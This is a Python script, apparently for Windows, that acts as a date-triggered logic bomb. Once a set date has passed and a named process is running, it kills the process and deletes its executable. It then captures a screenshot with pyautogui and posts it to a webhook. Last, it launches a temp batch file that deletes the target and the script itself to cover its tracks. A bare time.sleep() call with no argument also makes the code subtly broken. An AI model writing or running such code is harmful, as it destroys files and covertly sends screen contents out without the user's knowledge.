import datetime
import psutil
import os
import shutil
import time
import subprocess
import sys
import tempfile 
import requests
import pyautogui

#Thoose are examples used in testing (prset)

anio_personalizado = 2024
mes_personalizado = 2
dia_personalizado = 17

# Empty function (presset)

time.sleep()

#Thoose are examples used in testing (prset)

webhook_url = ""

#Thoose are examples used in testing (prset)

nombre_del_proceso = "test.exe"

def obtener_fecha_actual():
    return datetime.datetime.now().date()

def obtener_fecha_personalizada(anio, mes, dia):
    return datetime.date(anio, mes, dia)

def comparar_fechas(fecha_actual, fecha_personalizada):
    if fecha_actual == fecha_personalizada:
        return 1
    elif fecha_actual > fecha_personalizada:
        return 2
    else:
        return 0

def matar_proceso(pid):
    try:
        proceso = psutil.Process(pid)
        proceso.terminate()
        proceso.wait(timeout=5) 
        if proceso.is_running():
            subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
    except Exception as e:
        pass

def buscar_archivo(nombre_proceso):
    for p in psutil.process_iter():
        if nombre_proceso in p.name():
            return p.exe()
    return None

def borrar_archivo(ruta_archivo):
    intentos = 0
    while intentos < 3: 
        try:
            os.remove(ruta_archivo)
            return
        except Exception as e:
            time.sleep(2)
            intentos += 1

def verificar_proceso_activo(nombre_proceso):
    for proc in psutil.process_iter(['name', 'exe']):
        if proc.info['name'] == nombre_proceso:
            return True, proc.pid
    return False, None

def check_internet_connection():
    try:
        requests.get("http://www.google.com", timeout=3)
        return True
    except requests.ConnectionError:
        return False

if __name__ == "__main__":
    ruta_script = os.path.abspath(sys.argv[0])

    fecha_actual = obtener_fecha_actual()
    fecha_personalizada = obtener_fecha_personalizada(anio_personalizado, mes_personalizado, dia_personalizado)
    resultado_fecha = comparar_fechas(fecha_actual, fecha_personalizada)
    proceso_activo, pid_proceso = verificar_proceso_activo(nombre_del_proceso)

    if resultado_fecha >= 1 and proceso_activo:
        ruta_archivo = buscar_archivo(nombre_del_proceso)
        if ruta_archivo:
            time.sleep(5) 
            proceso_activo, pid_proceso = verificar_proceso_activo(nombre_del_proceso)
            if proceso_activo:
                matar_proceso(pid_proceso)
                time.sleep(5)
                borrar_archivo(ruta_archivo)
                time.sleep(2)

                batch_file_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
                with open(batch_file_path, "w") as batch_file:
                    batch_file.write(f'@echo off\n')
                    batch_file.write(f'timeout /t 5\n')
                    batch_file.write(f'taskkill /F /IM {nombre_del_proceso}\n')
                    batch_file.write(f'del "{ruta_script}"\n')
                    batch_file.write(f'del "{ruta_archivo}"\n')
                    batch_file.write(f'exit\n')

                os.chmod(batch_file_path, os.stat(ruta_script).st_mode)

            
                if not check_internet_connection():
                    subprocess.Popen([batch_file_path], shell=True, close_fds=True)

                else:
                    temp_screenshot_path = os.path.join(tempfile.gettempdir(), "captura_de_pantalla_temp.png")
                    pyautogui.screenshot(temp_screenshot_path) 
                    with open(temp_screenshot_path, "rb") as file:
                        files = {"file": file}
                        requests.post(webhook_url, files=files, data={"content": "The file is going to be deleated."})
                    subprocess.Popen([batch_file_path], shell=True, close_fds=True)


    elif resultado_fecha == 0:
        pass
    else:
        pass
